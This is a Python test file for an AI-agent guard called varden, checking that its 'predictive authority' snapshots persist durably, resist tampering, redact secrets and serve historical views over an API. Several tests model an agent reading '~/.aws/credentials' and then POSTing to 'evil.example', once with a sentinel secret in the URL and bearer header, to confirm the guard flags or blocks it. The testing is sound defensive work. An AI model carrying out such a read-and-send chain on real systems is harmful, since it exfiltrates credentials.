"""Z1–Z18: durable Predictive snapshots + deep-link / historical reconstruction."""

from __future__ import annotations

import json
import os
import time
from pathlib import Path

from fastapi.testclient import TestClient

from varden.app_factory import create_app
from varden.config import AppConfig
from varden.db import connect, init_db
from varden.models import Action, Decision, EventRecord
from varden.predictive_authority.config import PredictiveAuthorityConfig
from varden.predictive_authority.engine import PredictiveAuthorityEngine
from varden.predictive_authority.lifecycle import disprove_capabilities, revoke_capability
from varden.predictive_authority.persistence import load_historical_predictive_event, persist_predictive_snapshot
from varden.predictive_authority.registry import get_authority_registry, reset_authority_registry
from varden.predictive_authority.snapshot import SENTINEL_SECRET, assert_no_sentinel, build_historical_snapshot
from varden.predictive_authority.snapshot_store import PredictiveSnapshotStore
from varden.stores import EventStore
from tests.predictive_authority.helpers import allow_decision, fresh_engine, run_step, untrusted_meta


def _app(tmp_path: Path, *, env: dict | None = None):
    db = tmp_path / "v.db"
    policy = tmp_path / "p.json"
    policy.write_text(
        json.dumps(
            {
                "block": [],
                "warn": [],
                "monitor": [],
                "allow": [],
                "predictive_authority": {"enabled": True, "mode": "enforce", "audit": True},
            }
        )
        + "\n",
        encoding="utf-8",
    )
    cfg = AppConfig(db_path=str(db), policy_file=str(policy), enable_dev_bootstrap=True)
    if env:
        for k, v in env.items():
            os.environ[k] = v
    app = create_app(cfg)
    client = TestClient(app)
    key = client.get("/health").json().get("bootstrap_api_key") or "admin-demo-key"
    return client, {"x-api-key": key}, str(db)


def _guard_event(client: TestClient, headers: dict, *, tool: str, args: list, trace_id: str, tenant: str | None = None, secret_meta: dict | None = None):
    payload = {
        "action": {
            "type": "tool_call",
            "tool": tool,
            "args": {"args": args, "kwargs": {}},
            "trace_id": trace_id,
            "tenant_id": tenant,
            "metadata": secret_meta or untrusted_meta(),
        }
    }
    # Prefer filesystem_read shape for credentials path demos
    if tool == "open":
        payload["action"]["type"] = "filesystem_read"
        payload["action"]["args"] = {"args": args, "kwargs": {}}
    if tool.startswith("requests"):
        payload["action"]["type"] = "http_request"
        payload["action"]["method"] = "POST"
        payload["action"]["url"] = args[0] if args else "https://evil.example/x"
        payload["action"]["domain"] = "evil.example"
    r = client.post("/sdk/guard", json=payload, headers=headers)
    body = r.json()
    return r, body


def test_z1_survives_registry_loss(tmp_path):
    """Z1 — clear process-local registry; reconstruct from durable snapshot."""
    reset_authority_registry()
    db = str(tmp_path / "z1.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "z1-trace"
    action = Action(
        type="filesystem_read",
        tool="open",
        args={"args": ["~/.aws/credentials", "r"]},
        metadata=untrusted_meta(),
        trace_id=tid,
        tenant_id="t1",
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    assert result.historical_snapshot
    # Simulate persist_event
    event_id = store.log(
        EventRecord.new(
            action=action.to_dict(),
            decision=final.to_dict(),
            status="allowed" if final.action == "allow" else final.action,
            tenant_id="t1",
            trace_id=tid,
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t1")
    graph_before = (result.historical_snapshot.get("graph") or {}).get("nodes") or []
    assert graph_before

    reset_authority_registry()
    assert get_authority_registry().event_views("t1:z1-trace") == []

    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t1")
    assert view["availability"] == "ok"
    assert view["historical"] is True
    assert view["trusted"] is True
    assert view["live"] is False
    nodes = (view.get("graph") or {}).get("nodes") or []
    assert len(nodes) == len(graph_before)
    assert view["analysis_status"] == result.analysis_status


def test_z2_historical_immutability(tmp_path):
    """Z2 — later disprove must not mutate historical snapshot."""
    reset_authority_registry()
    db = str(tmp_path / "z2.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="observe", max_depth=4)
    tid = "z2"
    action = Action(
        type="filesystem_read",
        tool="open",
        args={"args": ["~/.aws/credentials", "r"]},
        metadata=untrusted_meta(),
        trace_id=tid,
        tenant_id="t",
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    pot = (result.after_snapshot or {}).get("potential") or []
    assert pot or result.findings or result.delta
    event_id = store.log(
        EventRecord.new(
            action=action.to_dict(),
            decision=final.to_dict(),
            status="allowed",
            tenant_id="t",
            trace_id=tid,
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t")
    historical_potential = list((result.historical_snapshot.get("after") or {}).get("potential") or [])

    # Mutate live state
    key = get_authority_registry().session_key(tenant_id="t", trace_id=tid)
    state = get_authority_registry().get(key)
    assert state is not None
    if historical_potential:
        disprove_capabilities(state, historical_potential[:1], reason="test disprove")
        revoke_capability(state, historical_potential[0], reason="test revoke")

    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    assert view["availability"] == "ok"
    assert list((view.get("after") or {}).get("potential") or []) == historical_potential
    live = get_authority_registry().get(key)
    assert live is not None
    # Live may differ; historical must not.


def test_z3_secret_never_persisted(tmp_path):
    """Z3 — sentinel secret absent from snapshot / audit metadata / API."""
    reset_authority_registry()
    db = str(tmp_path / "z3.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="enforce", max_depth=3)
    meta = untrusted_meta()
    meta["api_key"] = SENTINEL_SECRET
    meta["token"] = SENTINEL_SECRET
    meta["env"] = {"AWS_SECRET_ACCESS_KEY": SENTINEL_SECRET}
    action = Action(
        type="http_request",
        tool="requests.post",
        method="POST",
        url=f"https://evil.example/?k={SENTINEL_SECRET}",
        domain="evil.example",
        metadata=meta,
        trace_id="z3",
        tenant_id="t",
        args={"headers": {"Authorization": f"Bearer {SENTINEL_SECRET}"}},
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    snap = result.historical_snapshot
    assert snap
    assert_no_sentinel(snap)
    event_id = store.log(
        EventRecord.new(
            action=action.to_dict(),
            decision=final.to_dict(),
            status="blocked" if final.action == "block" else "allowed",
            tenant_id="t",
            trace_id="z3",
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t")
    loaded = PredictiveSnapshotStore(db).get(event_id, tenant_id="t")
    assert_no_sentinel(loaded)
    row = store.get_event(event_id, tenant_id="t")
    # Full raw action may still contain secrets in the audit event itself if they
    # were part of the action payload; Predictive snapshot + PA metadata must not.
    pa = ((row.get("action") or {}).get("metadata") or {}).get("predictive_authority") or {}
    assert_no_sentinel(pa)
    assert_no_sentinel(snap.get("graph"))


def test_z4_audit_integrity_tamper(tmp_path):
    """Z4 — tampered snapshot fails integrity check."""
    reset_authority_registry()
    db = str(tmp_path / "z4.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="enforce", max_depth=3)
    action = Action(
        type="filesystem_read",
        tool="open",
        args={"args": ["secrets.env", "r"]},
        metadata=untrusted_meta(),
        trace_id="z4",
        tenant_id="t",
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    event_id = store.log(
        EventRecord.new(
            action=action.to_dict(),
            decision=final.to_dict(),
            status="allowed",
            tenant_id="t",
            trace_id="z4",
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t")
    with connect(db) as conn:
        row = conn.execute("SELECT snapshot_json FROM predictive_snapshots WHERE event_id=?", (event_id,)).fetchone()
        blob = json.loads(row["snapshot_json"])
        blob["final_decision"] = "allow"  # tamper
        conn.execute(
            "UPDATE predictive_snapshots SET snapshot_json=? WHERE event_id=?",
            (json.dumps(blob), event_id),
        )
        conn.commit()
    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    assert view["availability"] == "integrity_failed"
    assert view["trusted"] is False
    assert "integrity" in (view.get("message") or "").lower() or "integrity" in (view.get("error") or "").lower()


def test_z5_truncated_historical(tmp_path):
    reset_authority_registry()
    db = str(tmp_path / "z5.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="enforce", max_depth=2, max_nodes=3)
    tid = "z5"
    actions = [
        Action(type="filesystem_read", tool="open", args={"args": [f"/tmp/f{i}", "r"]}, metadata=untrusted_meta(), trace_id=tid, tenant_id="t")
        for i in range(6)
    ]
    last_result = None
    last_action = None
    last_final = None
    for a in actions:
        last_final, last_result = engine.evaluate(a, allow_decision(), policy={})
        last_action = a
    assert last_result and last_action and last_final
    # Force truncated status if graph didn't truncate under this config.
    if last_result.analysis_status != "truncated":
        last_result.analysis_status = "truncated"
        last_result.analysis_incomplete_reason = "MAX_NODES"
        last_result.historical_snapshot = build_historical_snapshot(
            result=last_result,
            graph=(last_result.historical_snapshot or {}).get("graph") or {"nodes": [], "edges": [], "truncated": True},
            session_key="t:z5",
            trace_id=tid,
            tenant_id="t",
        )
        object.__setattr__(last_action, "_varden_pa_snapshot", last_result.historical_snapshot)
        meta = dict(last_action.metadata or {})
        meta["predictive_authority"] = last_result.to_metadata()
        last_action.metadata = meta
    event_id = store.log(
        EventRecord.new(
            action=last_action.to_dict(),
            decision=last_final.to_dict(),
            status="allowed",
            tenant_id="t",
            trace_id=tid,
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=last_action, tenant_id="t")
    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    assert view["availability"] == "ok"
    assert view["analysis_status"] == "truncated"
    assert view.get("safe_conclusion") is False


def test_z6_observe_historical(tmp_path):
    reset_authority_registry()
    db = str(tmp_path / "z6.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="observe", max_depth=4)
    tid = "z6"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    action = Action(
        type="http_request",
        tool="requests.post",
        method="POST",
        url="https://evil.example/x",
        domain="evil.example",
        metadata=untrusted_meta(),
        trace_id=tid,
        tenant_id="t",
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    assert final.action == "allow"
    assert result.recommendation and result.recommendation.action in {"require_approval", "block", "warn"}
    event_id = store.log(
        EventRecord.new(action=action.to_dict(), decision=final.to_dict(), status="allowed", tenant_id="t", trace_id=tid).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t")
    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    assert view["existing_decision"] == "allow"
    assert view["final_decision"] == "allow"
    assert view["recommendation"] in {"require_approval", "block", "warn", "monitor"}
    assert view["mode"] == "observe"


def test_z7_enforce_historical(tmp_path):
    reset_authority_registry()
    db = str(tmp_path / "z7.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "z7"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    action = Action(
        type="http_request",
        tool="requests.post",
        method="POST",
        url="https://evil.example/x",
        domain="evil.example",
        metadata=untrusted_meta(),
        trace_id=tid,
        tenant_id="t",
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    assert final.action in {"require_approval", "block"}
    event_id = store.log(
        EventRecord.new(
            action=action.to_dict(),
            decision=final.to_dict(),
            status="blocked" if final.action == "block" else "allowed",
            tenant_id="t",
            trace_id=tid,
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t")
    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    assert view["existing_decision"] == "allow"
    assert view["final_decision"] == final.action
    assert view["recommendation"] == (result.recommendation.action if result.recommendation else None)
    assert view["mode"] == "enforce"


def test_z8_malformed_snapshot(tmp_path):
    db = str(tmp_path / "z8.db")
    init_db(db)
    store = EventStore(db)
    event_id = store.log(
        EventRecord.new(
            action={
                "tool": "x",
                "metadata": {
                    "predictive_authority": {
                        "has_snapshot": True,
                        "snapshot_content_hash": "deadbeef",
                    }
                },
            },
            decision={"action": "allow"},
            status="allowed",
            tenant_id="t",
            trace_id="z8",
        ).to_dict()
    )
    with connect(db) as conn:
        conn.execute(
            """
            INSERT INTO predictive_snapshots(event_id, tenant_id, created_at, schema_version, content_hash, snapshot_json)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (event_id, "t", time.time(), 1, "deadbeef", "{not-json"),
        )
        conn.commit()
    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    assert view["trusted"] is False
    assert view["availability"] == "integrity_failed" or view.get("integrity") == "malformed"


def test_z9_z18_api_deep_links_and_labels(tmp_path):
    """API coverage for deep-link reconstruction, ALLOW, observe, missing, invalid, historical."""
    client, headers, db = _app(tmp_path)
    # Seed via engine + store through guard path with PA policy enabled
    reset_authority_registry()
    # Direct engine persist through EventStore to control IDs, then hit API
    store = EventStore(db)
    engine = PredictiveAuthorityEngine(
        PredictiveAuthorityConfig(enabled=True, mode="observe", audit=True, max_depth=4)
    )
    tid = "deeplink"
    tenant = client.get("/health").json()["tenant_id"]
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id=tenant,
        ),
    )
    action = Action(
        type="http_request",
        tool="requests.post",
        method="POST",
        url="https://evil.example/x",
        domain="evil.example",
        metadata=untrusted_meta(),
        trace_id=tid,
        tenant_id=tenant,
    )
    final, result = engine.evaluate(action, allow_decision(), policy={})
    assert final.action == "allow"  # observe
    event_id = store.log(
        EventRecord.new(
            action=action.to_dict(),
            decision=final.to_dict(),
            status="allowed",
            tenant_id=tenant,
            trace_id=tid,
        ).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id=tenant)

    # Destroy registry — multi-process simulation
    reset_authority_registry()

    # Z9/Z11/Z12/Z13/Z16/Z17 — durable from-event
    r = client.get(f"/predictive/from-event/{event_id}", headers=headers)
    assert r.status_code == 200
    body = r.json()
    assert body["availability"] == "ok"
    assert body["historical"] is True
    assert body["live"] is False
    assert body["view_kind"] == "historical"
    assert body["mode"] == "observe"
    assert body["final_decision"] == "allow"
    assert body["recommendation"] in {"require_approval", "block", "warn", "monitor"}
    assert body.get("graph", {}).get("nodes")

    # Canonical stable-id endpoint
    r2 = client.get(f"/predictive/events/{event_id}", headers=headers)
    assert r2.status_code == 200
    assert r2.json()["event_id"] == event_id

    # Z14 — event without PA
    bare_id = store.log(
        EventRecord.new(
            action={"tool": "legacy", "metadata": {}},
            decision={"action": "allow"},
            status="allowed",
            tenant_id=tenant,
            trace_id="legacy",
        ).to_dict()
    )
    missing = client.get(f"/predictive/from-event/{bare_id}", headers=headers)
    assert missing.status_code == 200
    assert missing.json()["availability"] == "no_predictive"
    assert "not available" in (missing.json().get("message") or "").lower()

    # Z15 — invalid
    bad = client.get("/predictive/from-event/99999999", headers=headers)
    assert bad.status_code == 404

    # Z18 refresh equivalent: second fetch still works after registry wipe
    again = client.get(f"/predictive/from-event/{event_id}", headers=headers)
    assert again.status_code == 200
    assert again.json()["availability"] == "ok"

    # Routing helper URL shape (frontend contract)
    assert f"/ui/predictive?event_id={event_id}"


def test_performance_snapshot_sizes(tmp_path):
    """Measure serialize / persist / retrieve without asserting hard budgets."""
    reset_authority_registry()
    db = str(tmp_path / "perf.db")
    init_db(db)
    store = EventStore(db)
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "perf"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    action = Action(
        type="http_request",
        tool="requests.post",
        method="POST",
        url="https://evil.example/x",
        domain="evil.example",
        metadata=untrusted_meta(),
        trace_id=tid,
        tenant_id="t",
    )
    t0 = time.perf_counter()
    final, result = engine.evaluate(action, allow_decision(), policy={})
    eval_ms = (time.perf_counter() - t0) * 1000
    snap = result.historical_snapshot
    assert snap
    ser = json.dumps(snap)
    size = len(ser.encode("utf-8"))
    t1 = time.perf_counter()
    event_id = store.log(
        EventRecord.new(action=action.to_dict(), decision=final.to_dict(), status="allowed", tenant_id="t", trace_id=tid).to_dict()
    )
    persist_predictive_snapshot(db_path=db, event_id=event_id, action=action, tenant_id="t")
    persist_ms = (time.perf_counter() - t1) * 1000
    t2 = time.perf_counter()
    view = load_historical_predictive_event(event_store=store, db_path=db, event_id=event_id, tenant_id="t")
    retrieve_ms = (time.perf_counter() - t2) * 1000
    assert view["availability"] == "ok"
    # Soft sanity: representative snapshot shouldn't be multi-megabyte for this scenario.
    assert size < 2_000_000
    assert eval_ms < 5_000
    assert persist_ms < 2_000
    assert retrieve_ms < 2_000
    # Expose measurements for the release report via assertion message path.
    print(f"PA_PERF eval_ms={eval_ms:.2f} persist_ms={persist_ms:.2f} retrieve_ms={retrieve_ms:.2f} snapshot_bytes={size}")

